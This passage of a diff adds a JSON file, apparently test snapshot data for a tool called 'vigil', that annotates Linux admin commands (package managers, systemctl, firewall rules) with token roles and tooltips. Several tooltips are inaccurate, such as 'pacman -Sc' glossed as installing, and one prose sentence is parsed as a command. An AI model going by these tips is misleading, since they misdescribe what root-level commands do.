+    "family": "debian",
+    "role": "pkgmgr",
+    "text": "apt-get",
+    "tip": "apt-get, Debian/Ubuntu's package manager."
+   },
+   {
+    "role": "remove",
+    "text": "purge",
+    "tip": "purge removes the packages named after it."
+   },
+   {
+    "role": "package",
+    "text": "x",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "sudo dnf autoremove": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "fedora",
+    "role": "pkgmgr",
+    "text": "dnf",
+    "tip": "dnf, Fedora's package manager."
+   },
+   {
+    "role": "remove",
+    "text": "autoremove",
+    "tip": "autoremove removes the packages named after it."
+   }
+  ],
+  "sudo dnf clean packages": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "fedora",
+    "role": "pkgmgr",
+    "text": "dnf",
+    "tip": "dnf, Fedora's package manager."
+   },
+   {
+    "role": "arg",
+    "text": "clean",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "packages",
+    "tip": "An argument for the command."
+   }
+  ],
+  "sudo dnf install x": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "fedora",
+    "role": "pkgmgr",
+    "text": "dnf",
+    "tip": "dnf, Fedora's package manager."
+   },
+   {
+    "role": "install",
+    "text": "install",
+    "tip": "install installs the packages named after it."
+   },
+   {
+    "role": "package",
+    "text": "x",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "sudo dnf remove x": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "fedora",
+    "role": "pkgmgr",
+    "text": "dnf",
+    "tip": "dnf, Fedora's package manager."
+   },
+   {
+    "role": "remove",
+    "text": "remove",
+    "tip": "remove removes the packages named after it."
+   },
+   {
+    "role": "package",
+    "text": "x",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "sudo dpkg --verify": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "debian",
+    "role": "pkgmgr",
+    "text": "dpkg",
+    "tip": "dpkg, the Debian package database."
+   },
+   {
+    "role": "flag",
+    "text": "--verify",
+    "tip": "An option that changes how the command behaves."
+   }
+  ],
+  "sudo emerge --ask --depclean x": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "gentoo",
+    "role": "pkgmgr",
+    "text": "emerge",
+    "tip": "emerge, Gentoo's package manager."
+   },
+   {
+    "role": "flag",
+    "text": "--ask",
+    "tip": "An option that changes how the command behaves."
+   },
+   {
+    "role": "remove",
+    "text": "--depclean",
+    "tip": "--depclean removes the package if nothing else needs it."
+   },
+   {
+    "role": "package",
+    "text": "x",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "sudo firewall-cmd --permanent --add-rich-rule='rule family=ipv4 reject'": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "command",
+    "text": "firewall-cmd",
+    "tip": "firewall-cmd, the firewalld firewall's command line"
+   },
+   {
+    "role": "flag",
+    "text": "--permanent",
+    "tip": "Keep the change after a reboot."
+   },
+   {
+    "role": "flag",
+    "text": "--add-rich-rule='rule",
+    "tip": "An option that changes how the command behaves."
+   },
+   {
+    "role": "arg",
+    "text": "family=ipv4",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "reject'",
+    "tip": "An argument for the command."
+   }
+  ],
+  "sudo flatpak uninstall --unused": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "flatpak",
+    "role": "pkgmgr",
+    "text": "flatpak",
+    "tip": "flatpak, the Flatpak app manager."
+   },
+   {
+    "role": "remove",
+    "text": "uninstall",
+    "tip": "uninstall removes the packages named after it."
+   },
+   {
+    "role": "flag",
+    "text": "--unused",
+    "tip": "An option that changes how the command behaves."
+   }
+  ],
+  "sudo journalctl --vacuum-size=200M": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "command",
+    "text": "journalctl",
+    "tip": "journalctl reads the system log"
+   },
+   {
+    "role": "flag",
+    "text": "--vacuum-size=200M",
+    "tip": "An option that changes how the command behaves."
+   }
+  ],
+  "sudo nft add table inet vigil": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "command",
+    "text": "nft",
+    "tip": "nft, the nftables firewall"
+   },
+   {
+    "role": "install",
+    "text": "add",
+    "tip": "Adds or turns something on."
+   },
+   {
+    "role": "arg",
+    "text": "table",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "inet",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "vigil",
+    "tip": "An argument for the command."
+   }
+  ],
+  "sudo nft delete table inet vigil": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "command",
+    "text": "nft",
+    "tip": "nft, the nftables firewall"
+   },
+   {
+    "role": "remove",
+    "text": "delete",
+    "tip": "Blocks or removes something."
+   },
+   {
+    "role": "arg",
+    "text": "table",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "inet",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "vigil",
+    "tip": "An argument for the command."
+   }
+  ],
+  "sudo nft list ruleset": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "command",
+    "text": "nft",
+    "tip": "nft, the nftables firewall"
+   },
+   {
+    "role": "arg",
+    "text": "list",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "ruleset",
+    "tip": "An argument for the command."
+   }
+  ],
+  "sudo paccache -rk2": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "command",
+    "text": "paccache",
+    "tip": "The program paccache."
+   },
+   {
+    "role": "flag",
+    "text": "-rk2",
+    "tip": "An option that changes how the command behaves."
+   }
+  ],
+  "sudo pacman -Qkk": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "arch",
+    "role": "pkgmgr",
+    "text": "pacman",
+    "tip": "pacman, Arch Linux's package manager."
+   },
+   {
+    "role": "flag",
+    "text": "-Qkk",
+    "tip": "-Q queries the installed-package database (read-only); o asks who owns a file."
+   }
+  ],
+  "sudo pacman -Rns foo": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "arch",
+    "role": "pkgmgr",
+    "text": "pacman",
+    "tip": "pacman, Arch Linux's package manager."
+   },
+   {
+    "role": "remove",
+    "text": "-Rns",
+    "tip": "-R removes the package; n removes its config files, s unneeded dependencies."
+   },
+   {
+    "role": "package",
+    "text": "foo",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "sudo pacman -S syncthing": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "arch",
+    "role": "pkgmgr",
+    "text": "pacman",
+    "tip": "pacman, Arch Linux's package manager."
+   },
+   {
+    "role": "install",
+    "text": "-S",
+    "tip": "-S installs (syncs) the packages named after it."
+   },
+   {
+    "role": "package",
+    "text": "syncthing",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "sudo pacman -Sc": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "arch",
+    "role": "pkgmgr",
+    "text": "pacman",
+    "tip": "pacman, Arch Linux's package manager."
+   },
+   {
+    "role": "install",
+    "text": "-Sc",
+    "tip": "-S installs (syncs) the packages named after it."
+   }
+  ],
+  "sudo pacman -Syu": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "arch",
+    "role": "pkgmgr",
+    "text": "pacman",
+    "tip": "pacman, Arch Linux's package manager."
+   },
+   {
+    "role": "install",
+    "text": "-Syu",
+    "tip": "-S installs (syncs) the packages named after it."
+   }
+  ],
+  "sudo python3 -m vigil serve": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "command",
+    "text": "python3",
+    "tip": "The program python3."
+   },
+   {
+    "role": "flag",
+    "text": "-m",
+    "tip": "An option that changes how the command behaves."
+   },
+   {
+    "role": "arg",
+    "text": "vigil",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "serve",
+    "tip": "An argument for the command."
+   }
+  ],
+  "sudo rpm -Va": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "rpm",
+    "role": "pkgmgr",
+    "text": "rpm",
+    "tip": "rpm, the RPM package database (Fedora, openSUSE)."
+   },
+   {
+    "role": "flag",
+    "text": "-Va",
+    "tip": "An option that changes how the command behaves."
+   }
+  ],
+  "sudo rules": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "command",
+    "text": "rules",
+    "tip": "The program rules."
+   }
+  ],
+  "sudo rules decide who can become root, and whether they need a password.": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "command",
+    "text": "rules",
+    "tip": "The program rules."
+   },
+   {
+    "role": "arg",
+    "text": "decide",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "who",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "can",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "become",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "root,",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "and",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "whether",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "they",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "need",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "a",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "password.",
+    "tip": "An argument for the command."
+   }
+  ],
+  "sudo systemctl disable --now foo.service": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "service",
+    "text": "systemctl",
+    "tip": "systemctl, which starts, stops and enables services"
+   },
+   {
+    "role": "remove",
+    "text": "disable",
+    "tip": "Stops it starting at boot."
+   },
+   {
+    "role": "flag",
+    "text": "--now",
+    "tip": "Also start/stop it right away, not only at next boot."
+   },
+   {
+    "role": "package",
+    "text": "foo.service",
+    "tip": "The service (or timer) this acts on."
+   }
+  ],
+  "sudo systemctl mask x": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "service",
+    "text": "systemctl",
+    "tip": "systemctl, which starts, stops and enables services"
+   },
+   {
+    "role": "remove",
+    "text": "mask",
+    "tip": "Blocks it from being started at all."
+   },
+   {
+    "role": "package",
+    "text": "x",
+    "tip": "The service (or timer) this acts on."
+   }
+  ],
+  "sudo systemctl reload y": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "service",
+    "text": "systemctl",
+    "tip": "systemctl, which starts, stops and enables services"
+   },
+   {
+    "role": "install",
+    "text": "reload",
+    "tip": "Re-reads its configuration."
+   },
+   {
+    "role": "package",
+    "text": "y",
+    "tip": "The service (or timer) this acts on."
+   }
+  ],
+  "sudo systemctl restart y": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "service",
+    "text": "systemctl",
+    "tip": "systemctl, which starts, stops and enables services"
+   },
+   {
+    "role": "install",
+    "text": "restart",
+    "tip": "Restarts it."
+   },
+   {
+    "role": "package",
+    "text": "y",
+    "tip": "The service (or timer) this acts on."
+   }
+  ],
+  "sudo systemctl unmask x": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "service",
+    "text": "systemctl",
+    "tip": "systemctl, which starts, stops and enables services"
+   },
+   {
+    "role": "install",
+    "text": "unmask",
+    "tip": "Allows it to start again."
+   },
+   {
+    "role": "package",
+    "text": "x",
+    "tip": "The service (or timer) this acts on."
+   }
+  ],
+  "sudo timedatectl set-ntp true": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "command",
+    "text": "timedatectl",
+    "tip": "timedatectl shows and sets the system clock"
+   },
+   {
+    "role": "arg",
+    "text": "set-ntp",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "true",
+    "tip": "An argument for the command."
+   }
+  ],
+  "sudo ufw deny out to 192.0.2.1": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "role": "command",
+    "text": "ufw",
+    "tip": "ufw, the 'uncomplicated firewall'"
+   },
+   {
+    "role": "remove",
+    "text": "deny",
+    "tip": "Blocks or removes something."
+   },
+   {
+    "role": "arg",
+    "text": "out",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "to",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "arg",
+    "text": "192.0.2.1",
+    "tip": "An argument for the command."
+   }
+  ],
+  "sudo xbps-remove -R x": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "void",
+    "role": "pkgmgr",
+    "text": "xbps-remove",
+    "tip": "xbps-remove, Void Linux's remover."
+   },
+   {
+    "role": "flag",
+    "text": "-R",
+    "tip": "An option that changes how the command behaves."
+   },
+   {
+    "role": "package",
+    "text": "x",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "sudo zypper clean --all": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "suse",
+    "role": "pkgmgr",
+    "text": "zypper",
+    "tip": "zypper, openSUSE's package manager."
+   },
+   {
+    "role": "arg",
+    "text": "clean",
+    "tip": "An argument for the command."
+   },
+   {
+    "role": "flag",
+    "text": "--all",
+    "tip": "Include inactive items too."
+   }
+  ],
+  "sudo zypper install x": [
+   {
+    "role": "admin",
+    "text": "sudo",
+    "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+   },
+   {
+    "family": "suse",
+    "role": "pkgmgr",
+    "text": "zypper",
+    "tip": "zypper, openSUSE's package manager."
+   },
+   {
+    "role": "install",
+    "text": "install",
+    "tip": "install installs the packages named after it."
+   },
+   {
+    "role": "package",
+    "text": "x",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "sudoedit /etc/sudoers": [
+   {
+    "role": "admin",
+    "text": "sudoedit",
+    "tip": "Opens the file in your editor with administrator rights, then saves it as root."
+   },
+   {
+    "role": "path",
+    "text": "/etc/sudoers",
+    "tip": "A file or folder path."
+   }
+  ],
+  "systemctl --user daemon-reload": [
+   {
+    "role": "service",
+    "text": "systemctl",
+    "tip": "systemctl, which starts, stops and enables services"
+   },
+   {
+    "role": "flag",
+    "text": "--user",
+    "tip": "Acts on your own user's services, not the system's: no admin rights needed."
+   },
+   {
+    "role": "arg",
+    "text": "daemon-reload",
+    "tip": "An argument for the command."
+   }
+  ],
+  "systemctl --user disable --now vigil-persist.timer": [
+   {
+    "role": "service",
+    "text": "systemctl",
+    "tip": "systemctl, which starts, stops and enables services"
+   },
+   {
+    "role": "flag",
+    "text": "--user",
+    "tip": "Acts on your own user's services, not the system's: no admin rights needed."
+   },
+   {
+    "role": "remove",
+    "text": "disable",
+    "tip": "Stops it starting at boot."
+   },
+   {
+    "role": "flag",
+    "text": "--now",
+    "tip": "Also start/stop it right away, not only at next boot."
+   },
+   {
+    "role": "package",
+    "text": "vigil-persist.timer",
+    "tip": "The service (or timer) this acts on."
+   }
+  ],
+  "systemctl --user enable --now vigil-persist.timer": [
+   {
+    "role": "service",
+    "text": "systemctl",
+    "tip": "systemctl, which starts, stops and enables services"
+   },
+   {
+    "role": "flag",
+    "text": "--user",
+    "tip": "Acts on your own user's services, not the system's: no admin rights needed."
+   },
+   {
+    "role": "install",
+    "text": "enable",
+    "tip": "Turns it on at every boot."
+   },
+   {
+    "role": "flag",
+    "text": "--now",
+    "tip": "Also start/stop it right away, not only at next boot."
+   },
+   {
+    "role": "package",
+    "text": "vigil-persist.timer",
+    "tip": "The service (or timer) this acts on."
+   }
+  ],
+  "systemctl --user enable --now x.timer": [
+   {
+    "role": "service",
+    "text": "systemctl",
+    "tip": "systemctl, which starts, stops and enables services"
+   },
+   {
+    "role": "flag",
+    "text": "--user",
+    "tip": "Acts on your own user's services, not the system's: no admin rights needed."
+   },
+   {
+    "role": "install",
+    "text": "enable",
+    "tip": "Turns it on at every boot."
+   },
+   {
+    "role": "flag",
+    "text": "--now",
+    "tip": "Also start/stop it right away, not only at next boot."
+   },
+   {
+    "role": "package",
+    "text": "x.timer",
+    "tip": "The service (or timer) this acts on."
+   }
+  ],
+  "systemctl --user stop bar.service": [
+   {
+    "role": "service",
+    "text": "systemctl",
+    "tip": "systemctl, which starts, stops and enables services"
+   },
+   {
+    "role": "flag",
+    "text": "--user",
+    "tip": "Acts on your own user's services, not the system's: no admin rights needed."
+   },
+   {
+    "role": "remove",
+    "text": "stop",
+    "tip": "Stops it now."
+   },
+   {
+    "role": "package",
+    "text": "bar.service",
+    "tip": "The service (or timer) this acts on."
+   }
+  ],
+  "systemctl list-timers --all": [
+   {
+    "role": "service",
+    "text": "systemctl",
+    "tip": "systemctl, which starts, stops and enables services"
+   },
+   {
+    "role": "flag",
+    "text": "list-timers",
+    "tip": "Lists scheduled jobs (read-only)."
+   },
+   {
+    "role": "flag",
+    "text": "--all",
+    "tip": "Include inactive items too."
+   }
+  ],
+  "systemctl status sshd": [
+   {
+    "role": "service",
+    "text": "systemctl",
+    "tip": "systemctl, which starts, stops and enables services"
+   },
+   {
+    "role": "flag",
+    "text": "status",
+    "tip": "Shows its state (read-only)."
+   },
+   {
+    "role": "package",
+    "text": "sshd",
+    "tip": "The service (or timer) this acts on."
+   }
+  ],
+  "systemctl status sshd.service": [
+   {
+    "role": "service",
+    "text": "systemctl",
+    "tip": "systemctl, which starts, stops and enables services"
+   },
+   {
+    "role": "flag",
+    "text": "status",
+    "tip": "Shows its state (read-only)."
+   },
+   {
+    "role": "package",
+    "text": "sshd.service",
+    "tip": "The service (or timer) this acts on."
+   }
+  ],
+  "ufw status": [
+   {
+    "role": "command",
+    "text": "ufw",
+    "tip": "ufw, the 'uncomplicated firewall'"
+   },
+   {
+    "role": "arg",
+    "text": "status",
+    "tip": "An argument for the command."
+   }
+  ],
+  "unknowntool --flag value": [
+   {
+    "role": "command",
+    "text": "unknowntool",
+    "tip": "The program unknowntool."
+   },
+   {
+    "role": "flag",
+    "text": "--flag",
+    "tip": "An option that changes how the command behaves."
+   },
+   {
+    "role": "arg",
+    "text": "value",
+    "tip": "An argument for the command."
+   }
+  ],
+  "xbps-install -S x": [
+   {
+    "family": "void",
+    "role": "pkgmgr",
+    "text": "xbps-install",
+    "tip": "xbps-install, Void Linux's installer."
+   },
+   {
+    "role": "flag",
+    "text": "-S",
+    "tip": "An option that changes how the command behaves."
+   },
+   {
+    "role": "package",
+    "text": "x",
+    "tip": "The package, app or service this acts on."
+   }
+  ],
+  "xbps-query -o /x": [
+   {
+    "family": "void",
+    "role": "pkgmgr",
+    "text": "xbps-query",
+    "tip": "xbps-query, Void Linux's package database."
+   },
+   {
+    "role": "flag",
+    "text": "-o",
+    "tip": "-o asks which package owns a file (read-only)."
+   },
+   {
+    "role": "path",
+    "text": "/x",
+    "tip": "A file or folder path."
+   }
+  ]
+ }
+}
